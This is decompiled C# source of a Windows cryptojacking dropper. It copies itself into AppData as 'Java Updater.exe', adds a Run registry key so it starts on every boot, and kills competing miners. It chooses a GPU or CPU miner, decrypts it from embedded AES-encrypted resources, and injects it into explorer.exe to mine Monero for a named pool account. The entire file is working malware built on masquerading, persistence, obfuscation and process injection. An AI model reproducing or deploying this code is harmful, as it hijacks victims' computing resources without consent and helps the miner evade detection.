using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

public class Program
{
	public Program()
	{
		Class7.amSa9D0zQvoBP();
		base._002Ector();
	}

	[STAThread]
	public static void Main()
	{
		Class8.kLjw4iIsCLsZtxc4lksN0j();
		Install();
		KillLastProc();
		Initialize();
	}

	public static void Install()
	{
		Thread.Sleep(1000);
		try
		{
			if (Operators.CompareString(Process.GetCurrentProcess().MainModule!.FileName, Path.Combine(Interaction.Environ("AppData"), "Java Updater.exe"), false) == 0)
			{
				return;
			}
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (Operators.CompareString(process.MainModule!.FileName, Path.Combine(Interaction.Environ("AppData"), "Java Updater.exe"), false) == 0)
					{
						process.Kill();
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			using (FileStream fileStream = new FileStream(Path.Combine(Interaction.Environ("AppData"), "Java Updater.exe"), FileMode.Create))
			{
				byte[] array = File.ReadAllBytes(Process.GetCurrentProcess().MainModule!.FileName);
				fileStream.Write(array, 0, array.Length);
			}
			Thread.Sleep(1000);
			Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\").SetValue(Path.GetFileName(Path.Combine(Interaction.Environ("AppData"), "Java Updater.exe")), Path.Combine(Interaction.Environ("AppData"), "Java Updater.exe"));
			Process.Start(Path.Combine(Interaction.Environ("AppData"), "Java Updater.exe"));
			Environment.Exit(0);
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public static byte[] GetTheResource(string Get_)
	{
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		ResourceManager resourceManager = new ResourceManager("sdfce", executingAssembly);
		return AES_Decryptor((byte[])resourceManager.GetObject(Get_));
	}

	public static void Run(byte[] PL, string arg, byte[] buffer)
	{
		try
		{
			Assembly.Load(PL).GetType("Project1.Program")!.GetMethod("Load", BindingFlags.Static | BindingFlags.Public)!.Invoke(null, new object[3] { buffer, "C:\\Windows\\explorer.exe", arg });
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void KillLastProc()
	{
		//IL_006e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0075: Expected O, but got Unknown
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		object objectValue = default(object);
		object objectValue2 = default(object);
		IEnumerable enumerable = default(IEnumerable);
		string text = default(string);
		ManagementObjectSearcher val = default(ManagementObjectSearcher);
		IEnumerator enumerator = default(IEnumerator);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 326:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0001;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_002a;
						case 4:
							goto IL_0057;
						case 5:
							goto IL_006a;
						case 6:
							goto IL_0075;
						case 7:
							goto IL_007f;
						case 8:
							goto IL_00a1;
						case 9:
							goto IL_00ca;
						case 10:
						case 11:
							goto IL_00e5;
						default:
							goto end_IL_0001;
						case 12:
							goto end_IL_0001_2;
						}
						goto default;
					}
					IL_00ca:
					num = 9;
					NewLateBinding.LateCall(objectValue, (Type)null, "Terminate", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					goto IL_00e5;
					IL_0008:
					num = 2;
					objectValue2 = RuntimeHelpers.GetObjectValue(Interaction.GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\" + Environment.UserDomainName + "\\root\\cimv2", (string)null));
					goto IL_002a;
					IL_002a:
					num = 3;
					enumerable = (IEnumerable)RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue2, (Type)null, "ExecQuery", new object[1] { "Select * from Win32_Process" }, (string[])null, (Type[])null, (bool[])null));
					goto IL_0057;
					IL_0057:
					num = 4;
					text = string.Format("select CommandLine from Win32_Process where Name='{0}'", "explorer.exe");
					goto IL_006a;
					IL_006a:
					num = 5;
					val = new ManagementObjectSearcher(text);
					goto IL_0075;
					IL_0075:
					num = 6;
					val.Get();
					goto IL_007f;
					IL_007f:
					num = 7;
					enumerator = enumerable.GetEnumerator();
					goto IL_008a;
					IL_008a:
					if (enumerator.MoveNext())
					{
						objectValue = RuntimeHelpers.GetObjectValue(enumerator.Current);
						goto IL_00a1;
					}
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
					goto end_IL_0001_2;
					IL_00e5:
					num = 11;
					goto IL_008a;
					IL_00a1:
					num = 8;
					if (NewLateBinding.LateGet(objectValue, (Type)null, "CommandLine", new object[0], (string[])null, (Type[])null, (bool[])null).ToString()!.Contains("--donate-level="))
					{
						goto IL_00ca;
					}
					goto IL_00e5;
					end_IL_0001:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 326;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void Initialize()
	{
		try
		{
			string text = "";
			byte[] array = null;
			if (GetGPU().ToLower().Contains("nvidia"))
			{
				if (Directory.Exists("C:\\Program Files\\NVIDIA GPU Computing Toolkit\\CUDA\\"))
				{
					text = "--cuda-bfactor=12 --cuda-bsleep=100";
					array = GetTheResource("rypma");
				}
				else
				{
					text = "--max-cpu-usage=50";
					array = GetTheResource("ltwuzsrn");
				}
			}
			else if (GetGPU().ToLower().Contains("amd"))
			{
				text = "--opencl-platform=0 --opencl-devices=0 --opencl-launch=1600x8,1600x8,1600x8";
				array = GetTheResource("culue");
			}
			else
			{
				text = "--max-cpu-usage=50";
				array = GetTheResource("ltwuzsrn");
			}
			Run(GetTheResource("nhott"), "-B --donate-level=1 -a RandomX --url=xmr.pool.minergate.com:45700 -u moreahno@gmail.com -p x -R --variant=-1 " + text, array);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static string GetGPU()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Expected O, but got Unknown
		//IL_0013: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0034: Expected O, but got Unknown
		//IL_00aa: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b1: Expected O, but got Unknown
		try
		{
			string text = "";
			ObjectQuery val = new ObjectQuery("SELECT * FROM Win32_VideoController");
			ManagementObjectSearcher val2 = new ManagementObjectSearcher(val);
			ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
			try
			{
				enumerator = val2.Get().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ManagementObject val3 = (ManagementObject)enumerator.get_Current();
					text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)text, ((ManagementBaseObject)val3).get_Item("VideoProcessor")), (object)" "));
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			if (!text.ToLower().Contains("nvidia") && !text.ToLower().Contains("amd"))
			{
				ManagementObjectEnumerator enumerator2 = default(ManagementObjectEnumerator);
				try
				{
					enumerator2 = val2.Get().GetEnumerator();
					while (enumerator2.MoveNext())
					{
						ManagementObject val4 = (ManagementObject)enumerator2.get_Current();
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)text, ((ManagementBaseObject)val4).get_Item("Name")), (object)" "));
					}
				}
				finally
				{
					((IDisposable)enumerator2)?.Dispose();
				}
				if (!text.ToLower().Contains("nvidia") && !text.ToLower().Contains("amd"))
				{
					return "";
				}
				return text;
			}
			return text;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static byte[] AES_Decryptor(byte[] input)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] result = default(byte[]);
		try
		{
			rijndaelManaged.Key = mD5CryptoServiceProvider.ComputeHash(Encoding.Default.GetBytes("jduywzdk"));
			rijndaelManaged.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
			result = cryptoTransform.TransformFinalBlock(input, 0, input.Length);
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	static Program()
	{
		Class8.kLjw4iIsCLsZtxc4lksN0j();
	}
}
